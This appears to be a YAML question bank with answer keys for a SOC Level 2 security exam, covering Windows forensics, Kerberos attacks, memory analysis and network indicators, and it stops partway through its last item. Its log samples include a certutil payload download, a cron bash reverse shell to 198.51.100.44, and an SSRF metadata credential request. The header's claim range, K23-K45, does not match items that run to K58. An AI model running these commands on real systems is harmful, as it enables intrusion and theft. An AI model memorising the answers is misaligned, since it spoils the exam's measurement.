# SOC L2 Knowledge Exam Bank (server-only: answers never leave the exam service).
# Every item states an authentic technical fact recorded as "certain" in docs/ops/soc-curriculum-claims.md (rows K23-K45).
# Objective alignment to any certification is UNVERIFIED until a human reviewer maps it.
# answer: index of the correct option (mcq, log); indices of every correct option (multi);
# the correct order of option indices (ordering).
version: 1
objectiveAlignment: UNVERIFIED
status: agent-checked
items:
  - id: kb-l2-sigma-syntax
    type: mcq
    skill: soc_threat_intel
    claim: K23
    stem: "In a Sigma detection rule, which top-level section specifies the data category, product, and service that the query applies to?"
    options: ["logsource", "detection", "condition", "references"]
    answer: [0]
    explanation: "In the Sigma specification, 'logsource' defines the event scope (category, product, service). 'detection' contains the search identifiers, and 'condition' defines the boolean evaluation logic."

  - id: kb-l2-yara-condition
    type: mcq
    skill: soc_malware_triage
    claim: K24
    stem: "In a YARA rule, which keyword modifier indicates that a string match must be surrounded by non-alphanumeric characters?"
    options: ["nocase", "wide", "fullword", "ascii"]
    answer: [2]
    explanation: "The 'fullword' modifier in YARA requires that the string not be preceded or followed by alphanumeric characters, preventing partial-word false matches."

  - id: kb-l2-prefetch-timestamps
    type: mcq
    skill: soc_endpoint_triage
    claim: K25
    stem: "On modern Windows systems (Windows 10 and later), how many historical execution timestamps does a Windows Prefetch (.pf) file record?"
    options: ["1", "4", "8", "16"]
    answer: [2]
    explanation: "Windows 10 introduced format changes to Prefetch files (.pf) that store up to 8 historical execution timestamps, compared to only 1 in Windows XP and earlier."

  - id: kb-l2-shimcache-features
    type: mcq
    skill: soc_endpoint_triage
    claim: K26
    stem: "Which of the following execution artifacts does Windows AppCompatCache (Shimcache) NOT record?"
    options: ["Execution run count", "File full path", "Last modified timestamp", "File size"]
    answer: [0]
    explanation: "Shimcache tracks binary existence, path, file size, and the file's last modified timestamp, but does NOT track execution count or the exact time of execution."

  - id: kb-l2-amcache-hash
    type: mcq
    skill: soc_endpoint_triage
    claim: K27
    stem: "Which cryptographic hash algorithm is historically calculated and stored for executed binaries within the Windows Amcache.hve registry hive?"
    options: ["MD5", "SHA-1", "SHA-256", "SHA-512"]
    answer: [1]
    explanation: "The Windows Amcache.hve hive records binary execution metadata including the SHA-1 hash of the file header (FileKey / FileId), compilation timestamp, and full path."

  - id: kb-l2-kerberoast-mechanism
    type: mcq
    skill: soc_credential_attacks
    claim: K28
    stem: "What Active Directory attribute must be present on a user account for an attacker to request a Kerberos service ticket for Kerberoasting (T1558.003)?"
    options: ["ServicePrincipalName", "userAccountControl", "adminCount", "msDS-KeyVersionNumber"]
    answer: [0]
    explanation: "Kerberoasting targets user accounts that have a ServicePrincipalName (SPN) defined. Any domain user can request a TGS ticket for an SPN and crack the ticket offline."

  - id: kb-l2-kerberoast-event
    type: log
    skill: soc_credential_attacks
    claim: K28
    stem: "Analyze this Windows Security log snippet. What attack is indicated by this ticket request?"
    log: "EventID: 4769\nService Name: SQLServiceAccount\nService ID: S-1-5-21-392841-482910-1004\nTicket Options: 0x40810000\nTicket Encryption Type: 0x17\nStatus: 0x0"
    options: [
      "Kerberoasting attack requesting an RC4-encrypted TGS ticket",
      "AS-REP roasting request for preauthentication bypass",
      "Pass-the-Hash logon attempt using NTLM network authentication",
      "Golden Ticket creation on the Domain Controller"
    ]
    answer: [0]
    explanation: "Event 4769 indicates a Kerberos service ticket (TGS) was requested. Ticket Encryption Type 0x17 (RC4-HMAC) for a user service account is a primary signature of Kerberoasting, as attackers request legacy RC4 ciphers to speed up offline cracking."

  - id: kb-l2-asrep-roast
    type: mcq
    skill: soc_credential_attacks
    claim: K29
    stem: "Which Active Directory account configuration allows an attacker to conduct AS-REP Roasting (T1558.004) without possessing any domain credentials?"
    options: [
      "Do not require Kerberos preauthentication (DONT_REQ_PREAUTH)",
      "Account is sensitive and cannot be delegated",
      "Use Kerberos DES encryption types for this account",
      "Password never expires (DONT_EXPIRE_PASSWORD)"
    ]
    answer: [0]
    explanation: "When an account has 'Do not require Kerberos preauthentication' set (UF_DONT_REQ_PREAUTH in userAccountControl), anyone can send a KRB_AS_REQ and receive a KRB_AS_REP encrypted with the user's password hash, crackable offline."

  - id: kb-l2-pth-ntlm
    type: mcq
    skill: soc_credential_attacks
    claim: K30
    stem: "In a Pass-the-Hash attack (T1550.002), what credential component is passed across the network to authenticate to a remote service?"
    options: [
      "The raw NTLM password hash",
      "The plaintext password",
      "A forged Kerberos TGT",
      "The LanMan (LM) hash only"
    ]
    answer: [0]
    explanation: "Pass-the-Hash relies on the NTLM authentication protocol design, which uses the NTLM hash of the password rather than the plaintext password to generate the challenge-response."

  - id: kb-l2-golden-ticket
    type: mcq
    skill: soc_credential_attacks
    claim: K31
    stem: "Which key or secret is required to forge a Kerberos Golden Ticket (T1558.001) in an Active Directory forest?"
    options: [
      "The KRBTGT account password hash or AES key",
      "The Domain Controller machine account password",
      "The Enterprise Administrator plaintext password",
      "The target file server machine account key"
    ]
    answer: [0]
    explanation: "A Golden Ticket is a forged Ticket Granting Ticket (TGT). Because TGTs are encrypted and signed by the KRBTGT service account key, possessing the KRBTGT hash or AES key enables forging tickets with arbitrary privileges."

  - id: kb-l2-silver-ticket
    type: mcq
    skill: soc_credential_attacks
    claim: K32
    stem: "Unlike a Golden Ticket, what is a key architectural characteristic of a Silver Ticket attack?"
    options: [
      "It requires no communication with the Domain Controller and targets a specific service",
      "It generates a valid TGT accepted by every server in the forest",
      "It requires compromising the KRBTGT account password hash",
      "It operates exclusively over Kerberos UDP port 88"
    ]
    answer: [0]
    explanation: "A Silver Ticket is a forged Service Ticket (TGS). It is encrypted with the specific service's computer account password hash. Because the target service validates the ticket locally without checking with the DC, no DC communication occurs."

  - id: kb-l2-bloodhound-graph
    type: mcq
    skill: soc_threat_intel
    claim: K33
    stem: "What primary mechanism does the BloodHound tool use to identify Active Directory attack paths?"
    options: [
      "Graph theory analysis of AD permissions, object ACLs, and group memberships",
      "Port scanning and banner grabbing against all internal servers",
      "Brute force password spraying against domain accounts",
      "Automated extraction of LSASS memory across domain workstations"
    ]
    answer: [0]
    explanation: "BloodHound models Active Directory domain objects, trust relationships, user memberships, and Access Control Lists (ACLs) as nodes and edges in a graph database to identify multi-hop escalation paths."

  - id: kb-l2-process-injection
    type: mcq
    skill: soc_endpoint_triage
    claim: K34
    stem: "Which process injection technique involves spawning a legitimate process in a suspended state, hollowing out its original executable sections, and writing malicious code in its place?"
    options: [
      "Process Hollowing",
      "DLL Side-Loading",
      "Thread Local Storage (TLS) Callback",
      "AppCert DLL Injection"
    ]
    answer: [0]
    explanation: "Process Hollowing (sub-technique of T1055) unmaps (ZwUnmapViewOfSection) the genuine code from a suspended target process and replaces it with shellcode or a malicious PE payload before resuming execution."

  - id: kb-l2-lolbas-certutil
    type: log
    skill: soc_endpoint_triage
    claim: K35
    stem: "What action is being performed by this LOLBAS command line?"
    log: "certutil.exe -urlcache -split -f https://example.com/assets/beacon.bin C:\\Users\\Public\\update.exe"
    options: [
      "Downloading a remote file over HTTP to disk to bypass perimeter filters",
      "Exporting a trusted root certificate from the local machine store",
      "Splitting a local digital certificate into public and private key files",
      "Checking the online CRL status of a remote website"
    ]
    answer: [0]
    explanation: "Attackers abuse Windows certutil.exe with the `-urlcache -split -f` parameters as a Living off the Land download utility to fetch arbitrary payloads from external URLs."

  - id: kb-l2-volatility-malfind
    type: mcq
    skill: soc_endpoint_triage
    claim: K36
    stem: "In Volatility memory forensics, what memory condition does the `malfind` plugin primarily search for?"
    options: [
      "Memory pages with PAGE_EXECUTE_READWRITE permissions not backed by a file on disk",
      "Unlinked processes in the ActiveProcessLinks doubly-linked list",
      "Kernel drivers lacking a valid Microsoft digital signature",
      "Terminated processes that still have open network socket handles"
    ]
    answer: [0]
    explanation: "The `malfind` plugin flags virtual memory ranges with write and execute permissions (PAGE_EXECUTE_READWRITE) where the memory region is unmapped (VadS) and contains executable PE or shellcode headers."

  - id: kb-l2-volatility-psscan
    type: mcq
    skill: soc_endpoint_triage
    claim: K36
    stem: "Why would a forensic analyst use the Volatility `psscan` plugin instead of `pslist`?"
    options: [
      "psscan finds unlinked processes by scanning for EPROCESS pool tags, detecting rootkits",
      "psscan runs much faster because it only reads the pagefile",
      "pslist cannot display process command lines on 64-bit systems",
      "psscan displays network connections while pslist only shows threads"
    ]
    answer: [0]
    explanation: "While `pslist` follows the ActiveProcessLinks doubly-linked list in the OS kernel, rootkits can unlink themselves (Direct Kernel Object Manipulation). `psscan` scans raw memory pools for EPROCESS signatures, finding unlinked hidden processes."

  - id: kb-l2-memory-acquisition
    type: ordering
    skill: soc_incident_response
    claim: K37
    stem: "According to RFC 3227, arrange these evidence sources in order of volatility from most volatile (1) to least volatile (4):"
    options: [
      "Registers and CPU cache",
      "Routing table, ARP cache, and process memory",
      "Temporary file systems and disk swap",
      "Archival media, optical disks, and backup printouts"
    ]
    answer: [0, 1, 2, 3]
    explanation: "RFC 3227 specifies the order of volatility: registers/cache first, followed by network routing/ARP/RAM, then local disk storage/temp files, and finally archival backups."

  - id: kb-l2-linux-persistence-cron
    type: log
    skill: soc_linux_logs
    claim: K38
    stem: "Analyze this entry found in `/var/spool/cron/crontabs/root`. What does this persistence mechanism execute?"
    log: "*/10 * * * * /bin/bash -c 'exec 5<>/dev/tcp/198.51.100.44/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'"
    options: [
      "A recurring reverse bash TCP shell to 198.51.100.44 every 10 minutes",
      "A scheduled backup of the /var/spool directory every 10 hours",
      "An automated NTP synchronization query across port 4444",
      "A local health check validating the availability of port 4444"
    ]
    answer: [0]
    explanation: "The cron syntax `*/10 * * * *` runs every 10 minutes, executing a standard pure-bash interactive reverse shell redirected through TCP port 4444 to destination IP 198.51.100.44."

  - id: kb-l2-linux-profile-vol
    type: mcq
    skill: soc_linux_logs
    claim: K39
    stem: "What two essential files are bundled to create a custom Volatility 2 profile for an acquired Linux memory dump?"
    options: [
      "Kernel debug symbols (module.dwarf) and the kernel symbol table (System.map)",
      "The /etc/passwd file and the loaded kernel module list (/proc/modules)",
      "The initramfs image and the bootloader configuration (/boot/grub.cfg)",
      "The Linux distribution release file and the sysctl configuration"
    ]
    answer: [0]
    explanation: "Volatility Linux profiles require a dwarf file containing data structure definitions generated via dwarfdump from kernel headers, paired with the System.map kernel symbol table."

  - id: kb-l2-cloudtrail-persistence
    type: mcq
    skill: soc_cloud_identity
    claim: K40
    stem: "Which AWS CloudTrail management event represents the creation of new static programmatic credentials for an IAM user?"
    options: [
      "CreateAccessKey",
      "AssumeRoleWithSAML",
      "GetSessionToken",
      "CreateLoginProfile"
    ]
    answer: [0]
    explanation: "The AWS IAM API action `CreateAccessKey` generates a new Access Key ID and Secret Access Key for an IAM user, a frequent technique used by adversaries to establish persistent programmatic access."

  - id: kb-l2-nist-scoping
    type: mcq
    skill: soc_incident_response
    claim: K41
    stem: "In NIST SP 800-61 incident response guidelines, why is thorough scoping conducted before implementing host containment?"
    options: [
      "To identify all compromised hosts and persistence channels so the adversary cannot pivot or re-enter",
      "To calculate the exact financial penalty owed to regulatory authorities",
      "Because containment actions require prior written approval from the attacker",
      "To avoid having to preserve volatile forensic evidence on workstations"
    ]
    answer: [0]
    explanation: "Premature containment of a single identified host alerts the adversary and allows them to maintain footholds or accelerate exfiltration on other undiscovered compromised systems across the network."

  - id: kb-l2-lateral-movement-ports
    type: multi
    skill: soc_network_monitoring
    claim: K42
    stem: "Select all network services and default ports commonly exploited for Windows lateral movement across internal corporate networks:"
    options: [
      "Server Message Block (SMB) on TCP 445",
      "Windows Remote Management (WinRM) on TCP 5985/5986",
      "Remote Desktop Protocol (RDP) on TCP 3389",
      "Simple Network Management Protocol (SNMP) on UDP 161"
    ]
    answer: [0, 1, 2]
    explanation: "SMB (port 445 via PsExec/Named Pipes), WinRM (port 5985/5986 via PowerShell remoting), and RDP (port 3389) are standard Windows administrative protocols frequently leveraged for lateral movement. SNMP is a network monitoring protocol."

  - id: kb-l2-stix-taxii
    type: mcq
    skill: soc_threat_intel
    claim: K43
    stem: "In cyber threat intelligence sharing frameworks, what is the fundamental distinction between STIX and TAXII?"
    options: [
      "STIX is the structured JSON language for threat information; TAXII is the protocol for exchanging it",
      "STIX is an intrusion detection system; TAXII is a firewall management application",
      "STIX is proprietary to Microsoft; TAXII is an open-source Linux kernel module",
      "STIX operates over raw UDP sockets; TAXII requires encrypted IPsec tunnels"
    ]
    answer: [0]
    explanation: "STIX (Structured Threat Information Expression) defines the standardized data format and JSON schemas for threat representations. TAXII (Trusted Automated Exchange of Intelligence Information) is the transport protocol over HTTPS."

  - id: kb-l2-etw-ti
    type: mcq
    skill: soc_endpoint_triage
    claim: K44
    stem: "What is the primary role of the Microsoft-Windows-Threat-Intelligence Event Tracing for Windows (ETW) provider in enterprise detection?"
    options: [
      "Provides kernel-level telemetry regarding memory injection, thread creation, and process manipulation to early-launch anti-malware (ELAM) drivers",
      "Scans network packet payloads arriving on external web application interfaces",
      "Enforces Active Directory password complexity and expiration policies",
      "Compresses and archives historical security audit logs to local disk"
    ]
    answer: [0]
    explanation: "The Microsoft-Windows-Threat-Intelligence ETW provider is a protected kernel-level telemetry source accessible only to PPL (Protected Process Light) antimalware drivers, exposing events like process hollowing and memory manipulation."

  - id: kb-l2-ssrf-metadata
    type: log
    skill: soc_web_attacks
    claim: K45
    stem: "Analyze this HTTP request log line. What web vulnerability and exploitation target is indicated?"
    log: "GET /proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1 200 421"
    options: [
      "Server-Side Request Forgery (SSRF) targeting cloud instance metadata to steal IAM role credentials",
      "Cross-Site Scripting (XSS) attempting to execute JavaScript in an administrator browser",
      "Directory traversal attempting to read /etc/shadow from the local web server",
      "Blind SQL injection querying database version schemas"
    ]
    answer: [0]
    explanation: "The query abuses the proxy parameter to force the server to query the link-local cloud metadata address (169.254.169.254), attempting to extract IAM temporary security credentials (SSRF, ATT&CK T1552.005)."

  - id: kb-l2-dcsync
    type: mcq
    skill: soc_credential_attacks
    claim: K46
    stem: "Which Active Directory extended right is exploited by an attacker performing a DCSync attack to replicate user password hashes?"
    options: [
      "DS-Replication-Get-Changes-All",
      "Reset-Password",
      "GenericAll on Domain Users",
      "Write-Account-Restrictions"
    ]
    answer: [0]
    explanation: "DCSync impersonates a Domain Controller using the Directory Replication Service Remote Protocol (MS-DRSR), requiring DS-Replication-Get-Changes and DS-Replication-Get-Changes-All permissions to replicate credentials including the KRBTGT hash."

  - id: kb-l2-usn-journal
    type: mcq
    skill: soc_windows_logs
    claim: K47
    stem: "In NTFS forensic analysis, what primary investigative intelligence is provided by the Update Sequence Number ($UsnJrnl) journal?"
    options: [
      "A chronological record of file and directory metadata modifications (creations, deletions, renames) even if files were subsequently purged",
      "Full plaintext contents of web browser HTTP POST submissions",
      "Memory dumps of suspended processes during an operating system crash",
      "Active firewall state tables and routing table cache"
    ]
    answer: [0]
    explanation: "The NTFS USN Journal ($UsnJrnl:$J) tracks filesystem changes and reason masks (file create, delete, rename, data overwrite) with timestamps, helping analysts identify files staged or anti-forensically wiped by an adversary."

  - id: kb-l2-mft-timestomping
    type: mcq
    skill: soc_windows_logs
    claim: K48
    stem: "When an attacker uses a timestomping utility to alter file timestamps on an NTFS volume, which attribute is typically spoofed while leaving the other intact?"
    options: [
      "$STANDARD_INFORMATION timestamps are altered; $FILE_NAME timestamps retain original metadata",
      "$FILE_NAME timestamps are altered; $DATA streams are erased",
      "$SECURITY_DESCRIPTOR is overwritten with null bytes",
      "$BITMAP allocation clusters are reversed"
    ]
    answer: [0]
    explanation: "Timestomping tools running in user mode update the $STANDARD_INFORMATION attribute via standard Win32 SetFileTime APIs. The $FILE_NAME attribute is managed directly by the NTFS filesystem driver and reflects the true modification time."

  - id: kb-l2-srum-forensics
    type: mcq
    skill: soc_endpoint_triage
    claim: K49
    stem: "What forensic telemetry stored in Windows SRUM (SRUDB.dat) is invaluable for validating suspected data exfiltration?"
    options: [
      "Historical network bytes sent and received per application and user SID over a 30-day window",
      "Plaintext passwords entered into RDP login dialogs",
      "Decrypted TLS session pre-master keys",
      "Cached DNS responses from the local hosts file"
    ]
    answer: [0]
    explanation: "The Windows System Resource Usage Monitor (SRUM, stored in C:\\Windows\\System32\\sru\\SRUDB.dat) logs application execution history, CPU usage, and network data transferred (bytes sent/received) categorized by application binary path and user SID."

  - id: kb-l2-kerberos-unconstrained
    type: mcq
    skill: soc_credential_attacks
    claim: K50
    stem: "Why does Unconstrained Kerberos Delegation pose a critical security risk when a domain computer is compromised?"
    options: [
      "Authenticating users forward their complete Ticket Granting Ticket (TGT) to the server, which caches it in LSASS memory where an adversary can extract it",
      "It disables Kerberos preauthentication across the entire Active Directory domain",
      "It allows any standard user to add themselves to the Domain Admins group via LDAP",
      "It permits unauthenticated anonymous SMB connections to administrative file shares"
    ]
    answer: [0]
    explanation: "With Unconstrained Delegation (TRUSTED_FOR_DELEGATION), whenever a user connects to the server, their forwardable TGT is stored in LSASS. If an attacker has local administrative access to that host, they can dump the TGT and impersonate the user anywhere in the domain."

  - id: kb-l2-adminsdholder
    type: mcq
    skill: soc_credential_attacks
    claim: K51
    stem: "How do adversaries leverage the Active Directory AdminSDHolder object for stealthy enterprise persistence?"
    options: [
      "They add a backdoor Access Control Entry (ACE) to AdminSDHolder, which the SDProp process automatically propagates to all protected administrative accounts every 60 minutes",
      "They change the default port of Domain Controller replication from 389 to 4444",
      "They disable the KRBTGT password rotation policy",
      "They forge an Active Directory Certificate Services root CA certificate"
    ]
    answer: [0]
    explanation: "The Security Descriptor Propagator (SDProp) runs periodically on the PDC Emulator to compare permissions of protected accounts against the AdminSDHolder container. Modifying AdminSDHolder's ACL ensures any injected rights are consistently reapplied."

  - id: kb-l2-linux-ldpreload
    type: mcq
    skill: soc_linux_logs
    claim: K52
    stem: "On Linux systems, how is the LD_PRELOAD environment variable or /etc/ld.so.preload abused for userland persistence?"
    options: [
      "Forces the dynamic linker to load an attacker-controlled shared object before any standard C library functions, intercepting system calls",
      "Recompiles the Linux kernel upon system restart",
      "Clears the bash shell history file (/dev/null redirection)",
      "Directly modifies the physical hardware MAC address of the network interface"
    ]
    answer: [0]
    explanation: "LD_PRELOAD specifies libraries to be loaded first by the dynamic linker (ld.so). Adversaries leverage this to hook library calls (such as open, readdir, or connect) to hide processes, files, or network sockets from system diagnostic utilities like ps and ls."

  - id: kb-l2-linux-pam-backdoor
    type: mcq
    skill: soc_linux_logs
    claim: K53
    stem: "When analyzing Linux authentication mechanisms, what is the impact of an adversary modifying /etc/pam.d/common-auth?"
    options: [
      "Can introduce a backdoor authentication module or master password accepted for any local or SSH user account",
      "Prevents root from accessing the system console",
      "Forces all user passwords to be stored in cleartext in /var/log/auth.log",
      "Terminates all active network connections immediately"
    ]
    answer: [0]
    explanation: "Pluggable Authentication Modules (PAM) govern authentication policies on Linux. Modifying PAM configurations or deploying a trojanized pam_unix.so allows adversaries to define backdoor master passwords that authenticate successfully for any system account."

  - id: kb-l2-domain-fronting
    type: mcq
    skill: soc_network_indicators
    claim: K54
    stem: "How does an adversary successfully execute a Domain Fronting technique through a Content Delivery Network (CDN)?"
    options: [
      "Specifies a benign permitted domain in the TLS SNI header while routing to a malicious backend domain via the HTTP Host header inside the encrypted tunnel",
      "Registers a typosquatted domain name identical to the corporate victim",
      "Intercepts and modifies DNS responses in transit using ARP spoofing",
      "Injects malicious JavaScript into the CDN's static CSS files"
    ]
    answer: [0]
    explanation: "Domain Fronting takes advantage of CDNs that host multiple customers behind shared IP addresses. Network perimeter filters only inspect the outer TLS SNI header (which lists an approved domain), while the CDN terminates TLS and routes traffic according to the inner HTTP Host header."

  - id: kb-l2-ja3-fingerprint
    type: mcq
    skill: soc_network_traffic
    claim: K55
    stem: "In network security monitoring, what specific components of a TLS Client Hello packet are hashed to generate a JA3 fingerprint?"
    options: [
      "TLS Version, Accepted Ciphers, List of Extensions, Elliptic Curves, and Elliptic Curve Point Formats",
      "Source IP address, Destination IP address, TCP Source Port, and Payload Byte Length",
      "The SHA-256 hash of the server's X.509 SSL Certificate",
      "The MD5 checksum of the transferred HTTP body payload"
    ]
    answer: [0]
    explanation: "JA3 concatenates decimal values of TLS Version, Cipher Suites, Extensions, Supported Elliptic Curves, and Curve Point Formats in the Client Hello message, hashing the resulting string with MD5 to fingerprint the client application implementation."

  - id: kb-l2-doh-exfiltration
    type: mcq
    skill: soc_network_indicators
    claim: K56
    stem: "Why does an adversary utilize DNS over HTTPS (DoH) for command and control or data staging rather than standard DNS?"
    options: [
      "DoH encapsulates DNS queries in standard HTTPS traffic over TCP port 443, concealing query contents and bypassing enterprise DNS inspection and sinkholes",
      "DoH operates at the data link layer without requiring an IP address",
      "DoH automatically compresses files into encrypted zip archives",
      "DoH queries are impossible for web proxy firewalls to route"
    ]
    answer: [0]
    explanation: "Standard DNS runs unencrypted over UDP 53, allowing network security appliances to log domain lookups and sinkhole malicious domains. DoH (RFC 8484) wraps queries inside TLS encrypted HTTPS sessions to public resolvers, blinding perimeter DNS monitoring."

  - id: kb-l2-volatility-vadinfo
    type: mcq
    skill: soc_endpoint_triage
    claim: K57
    stem: "In Volatility memory analysis, which plugin inspects Virtual Address Descriptor (VAD) trees to locate executable memory regions unbacked by disk files?"
    options: [
      "vadinfo",
      "netscan",
      "hivelist",
      "cmdline"
    ]
    answer: [0]
    explanation: "The `vadinfo` plugin traverses the VAD tree of an EPROCESS structure to identify memory segments allocated with executable permissions (such as PAGE_EXECUTE_READWRITE) that lack backing image files on disk, a strong signature of injected shellcode."

  - id: kb-l2-sigma-condition
    type: mcq
    skill: soc_siem_correlation
    claim: K58
    stem: "In a generic Sigma detection rule YAML definition, which top-level attribute specifies the logical evaluation between named selection identifiers?"
    options: [
      "detection.condition",
      "logsource.category",
      "tags.mitre",
      "falsepositives.rules"
    ]
    answer: [0]
    explanation: "In Sigma specifications, the `detection` section contains search identifier maps (e.g. `selection`, `filter`) and a mandatory `condition` expression (e.g. `selection and not filter` or `1 of selection*`) establishing the Boolean trigger logic."

  - id: kb-l2-yara-modifiers
    type: multi
